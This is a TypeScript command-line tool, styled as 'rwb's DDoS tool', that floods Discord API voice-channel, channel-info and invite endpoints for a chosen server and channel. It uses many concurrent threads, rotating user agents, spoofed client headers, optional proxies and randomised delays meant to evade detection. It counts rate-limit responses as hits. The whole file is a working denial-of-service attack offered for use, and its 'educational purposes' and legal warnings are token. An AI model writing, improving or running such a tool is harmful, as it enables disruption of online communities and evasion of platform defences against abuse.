import axios, { AxiosInstance } from 'axios';
import * as dotenv from 'dotenv';
import { createInterface } from 'readline';
import chalk from 'chalk';
import Table from 'cli-table3';
import figlet from 'figlet';

dotenv.config();

// Discord API endpoints related to voice channels
const DISCORD_API_BASE = 'https://discord.com/api/v10';
const VC_ENDPOINTS = [
  '/voice/v2/regions',  // Voice regions endpoint
  '/guilds/{guild_id}/voice-states/@me',  // Voice state update
  '/guilds/{guild_id}/voice-states/{user_id}',  // Voice state manipulation
  '/channels/{channel_id}/invites',  // Channel invites
  '/channels/{channel_id}',  // Channel info
  '/guilds/{guild_id}/channels',  // Guild channels list
];

interface AttackConfig {
  targetGuildId: string;
  targetChannelId: string;
  attackType: 'voice-state' | 'channel-info' | 'invite-spam' | 'mixed';
  threads: number;
  requestsPerThread: number;
  delayBetweenRequests: number;
  useProxyList: boolean;
}

interface AttackStats {
  totalRequests: number;
  successfulRequests: number;
  failedRequests: number;
  startTime: Date;
  endTime?: Date;
  currentThreads: number;
}

class VCDDoSAttacker {
  private config: AttackConfig;
  private stats: AttackStats;
  private running: boolean = false;
  private threads: WorkerThread[] = [];
  private axiosInstance: AxiosInstance;
  private proxyList: string[] = [];

  constructor(config: AttackConfig) {
    this.config = config;
    this.stats = {
      totalRequests: 0,
      successfulRequests: 0,
      failedRequests: 0,
      startTime: new Date(),
      currentThreads: 0
    };

    // Create axios instance with custom headers
    this.axiosInstance = axios.create({
      baseURL: DISCORD_API_BASE,
      timeout: 10000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'X-Debug-Options': 'bugReporterEnabled',
        'X-Discord-Locale': 'en-US',
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI2MjUxNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='
      }
    });

    this.loadProxyList();
  }

  private loadProxyList(): void {
    // Load proxies from environment or file if enabled
    if (this.config.useProxyList) {
      try {
        const proxies = process.env.PROXY_LIST?.split(',') || [];
        this.proxyList = proxies.filter(proxy => proxy.trim() !== '');
        if (this.proxyList.length > 0) {
          console.log(chalk.green(`Loaded ${this.proxyList.length} proxies`));
        }
      } catch (error) {
        console.log(chalk.yellow('No proxy list found, using direct connections'));
      }
    }
  }

  private getRandomUserAgent(): string {
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
  }

  private getRandomEndpoint(): string {
    const endpoint = VC_ENDPOINTS[Math.floor(Math.random() * VC_ENDPOINTS.length)];
    return endpoint
      .replace('{guild_id}', this.config.targetGuildId)
      .replace('{channel_id}', this.config.targetChannelId)
      .replace('{user_id}', '123456789012345678'); // Random user ID
  }

  private async makeAttackRequest(): Promise<boolean> {
    const endpoint = this.getRandomEndpoint();
    const method = Math.random() > 0.7 ? 'POST' : 'GET';
    
    const requestConfig: any = {
      method,
      headers: {
        'User-Agent': this.getRandomUserAgent()
      }
    };

    // Add random delay to avoid pattern detection
    await new Promise(resolve => setTimeout(resolve, Math.random() * this.config.delayBetweenRequests));

    try {
      const response = await this.axiosInstance.request({
        url: endpoint,
        method,
        ...requestConfig
      });

      if (response.status >= 200 && response.status < 400) {
        return true;
      }
      return false;
    } catch (error: any) {
      if (error.response?.status === 429) {
        return true;
      }
      return false;
    }
  }

  private async workerThread(): Promise<void> {
    for (let i = 0; i < this.config.requestsPerThread && this.running; i++) {
      const success = await this.makeAttackRequest();
      
      // Update stats
      this.stats.totalRequests++;
      if (success) {
        this.stats.successfulRequests++;
      } else {
        this.stats.failedRequests++;
      }

      // Random delay between requests
      if (i < this.config.requestsPerThread - 1) {
        await new Promise(resolve => setTimeout(resolve, Math.random() * 100));
      }
    }
  }

  private renderStats(): void {
    const duration = new Date().getTime() - this.stats.startTime.getTime();
    const requestsPerSecond = this.stats.totalRequests / (duration / 1000);
    
    console.clear();
    
    // Title
    console.log(chalk.red(figlet.textSync('VC DDoS', { font: 'Slant' })));
    console.log(chalk.bold.red('ATTACK IN PROGRESS...\n'));
    
    // Configuration table
    const configTable = new Table({
      head: [chalk.white('Parameter'), chalk.white('Value')],
      colWidths: [25, 50],
      style: { border: ['red'] }
    });
    
    configTable.push(
      ['Target Guild ID', chalk.yellow(this.config.targetGuildId)],
      ['Target Channel ID', chalk.yellow(this.config.targetChannelId)],
      ['Attack Type', chalk.magenta(this.config.attackType)],
      ['Threads', chalk.cyan(this.config.threads.toString())],
      ['Requests/Thread', chalk.cyan(this.config.requestsPerThread.toString())]
    );
    
    console.log(configTable.toString());
    
    // Stats table
    const statsTable = new Table({
      head: [chalk.white('Metric'), chalk.white('Value')],
      colWidths: [25, 50],
      style: { border: ['white'] }
    });
    
    const successRate = this.stats.totalRequests > 0 
      ? ((this.stats.successfulRequests / this.stats.totalRequests) * 100).toFixed(2)
      : '0.00';
    
    statsTable.push(
      ['Total Requests', chalk.green(this.stats.totalRequests.toString())],
      ['Successful', chalk.green(this.stats.successfulRequests.toString())],
      ['Failed', chalk.red(this.stats.failedRequests.toString())],
      ['Success Rate', chalk.yellow(`${successRate}%`)],
      ['Requests/Second', chalk.cyan(requestsPerSecond.toFixed(2))],
      ['Duration', chalk.cyan(`${(duration / 1000).toFixed(1)}s`)]
    );
    
    console.log('\n' + statsTable.toString());
    
    // Progress indicator
    const totalRequests = this.config.threads * this.config.requestsPerThread;
    const progress = Math.min((this.stats.totalRequests / totalRequests) * 100, 100);
    
    const progressBar = '█'.repeat(Math.floor(progress / 2)) + 
                       '░'.repeat(50 - Math.floor(progress / 2));
    
    console.log(chalk.blue('\nAttack Progress:'));
    console.log(chalk.cyan(`[${progressBar}] ${progress.toFixed(1)}%`));
    console.log(chalk.gray(`\n>> Press Ctrl+C to stop attack`));
  }

  async start(): Promise<void> {
    if (this.running) {
      console.log(chalk.yellow('Attack already running'));
      return;
    }

    this.running = true;
    this.stats.startTime = new Date();
    
    console.log(chalk.red('Starting DDoS attack...'));
    console.log(chalk.yellow('WARNING: This may violate Discord ToS and local laws'));
    
    // Start worker threads
    this.threads = [];
    for (let i = 0; i < this.config.threads; i++) {
      const thread = new WorkerThread(this);
      this.threads.push(thread);
      thread.start();
    }

    // Update stats display
    const statsInterval = setInterval(() => {
      if (this.running) {
        this.renderStats();
      } else {
        clearInterval(statsInterval);
        this.renderStats();
        console.log(chalk.green('\nAttack completed!'));
      }
    }, 1000);

    // Wait for all threads to complete
    await Promise.all(this.threads.map(thread => thread.waitForCompletion()));
    
    this.running = false;
    this.stats.endTime = new Date();
    clearInterval(statsInterval);
  }

  stop(): void {
    console.log(chalk.yellow('\nStopping attack...'));
    this.running = false;
  }

  getStats(): AttackStats {
    return { ...this.stats };
  }
}

class WorkerThread {
  constructor(private attacker: VCDDoSAttacker) {}

  private workerPromise?: Promise<void>;

  start(): void {
    this.workerPromise = this.attacker['workerThread']();
  }

  async waitForCompletion(): Promise<void> {
    if (this.workerPromise) {
      await this.workerPromise;
    }
  }
}

// CLI Interface
const rl = createInterface({
  input: process.stdin,
  output: process.stdout
});

function question(query: string): Promise<string> {
  return new Promise(resolve => rl.question(query, resolve));
}

async function promptForConfig(): Promise<AttackConfig> {
  console.clear();
  console.log(chalk.red(figlet.textSync("rwb's DDoS tool", { font: 'Slant' })));
  console.log(chalk.yellow('WARNING: This tool is for educational purposes only\n'));

  const targetGuildId = await question(chalk.cyan('Enter target Guild/Server ID: '));
  const targetChannelId = await question(chalk.cyan('Enter target Voice Channel ID: '));

  console.log(chalk.cyan('\n=== Attack Type ==='));
  console.log('1. Voice State Spam (most effective)');
  console.log('2. Channel Info Requests');
  console.log('3. Invite Creation Spam');
  console.log('4. Mixed Attack (recommended)');
  
  const attackChoice = await question(chalk.cyan('\nSelect attack type (1-4): '));
  const attackTypes: AttackConfig['attackType'][] = ['voice-state', 'channel-info', 'invite-spam', 'mixed'];
  const attackType = attackTypes[parseInt(attackChoice) - 1] || 'mixed';

  const threads = parseInt(await question(chalk.cyan('Number of concurrent threads (10-100): '))) || 50;
  const requestsPerThread = parseInt(await question(chalk.cyan('Requests per thread (100-5000): '))) || 1000;
  const delay = parseInt(await question(chalk.cyan('Max delay between requests (ms, 0-1000): '))) || 100;

  const useProxy = (await question(chalk.cyan('Use proxy list? (y/n): '))).toLowerCase() === 'y';

  return {
    targetGuildId: targetGuildId.trim(),
    targetChannelId: targetChannelId.trim(),
    attackType,
    threads: Math.max(1, Math.min(100, threads)),
    requestsPerThread: Math.max(100, Math.min(5000, requestsPerThread)),
    delayBetweenRequests: Math.max(0, Math.min(1000, delay)),
    useProxyList: useProxy
  };
}

async function main() {
  try {
    const config = await promptForConfig();
    
    console.log(chalk.yellow('\nFINAL WARNING:'));
    console.log(chalk.yellow('• This may violate Discord Terms of Service'));
    console.log(chalk.yellow('• This may be illegal in your jurisdiction'));
    console.log(chalk.yellow('• Use at your own risk'));
    
    const confirmation = await question(chalk.red('\nType "CONFIRM" to start attack: '));
    
    if (confirmation.trim().toUpperCase() !== 'CONFIRM') {
      console.log(chalk.green('\nAttack cancelled.'));
      rl.close();
      return;
    }

    const attacker = new VCDDoSAttacker(config);
    
    // Handle Ctrl+C
    process.on('SIGINT', () => {
      attacker.stop();
      setTimeout(() => {
        console.log(chalk.green('\nAttack stopped by user.'));
        rl.close();
        process.exit(0);
      }, 1000);
    });

    await attacker.start();
    
    const finalStats = attacker.getStats();
    console.log(chalk.green('\n' + '='.repeat(50)));
    console.log(chalk.green('ATTACK COMPLETED'));
    console.log(chalk.green('='.repeat(50)));
    console.log(chalk.cyan(`Total Requests: ${finalStats.totalRequests}`));
    console.log(chalk.cyan(`Duration: ${((finalStats.endTime!.getTime() - finalStats.startTime.getTime()) / 1000).toFixed(1)}s`));
    
  } catch (error: any) {
    console.error(chalk.red('\n Error:'), error.message);
  } finally {
    rl.close();
  }
}

// Start the application
if (require.main === module) {
  main().catch(error => {
    console.error(chalk.red('Fatal error:'), error);
    process.exit(1);
  });
}

export { VCDDoSAttacker, AttackConfig, AttackStats };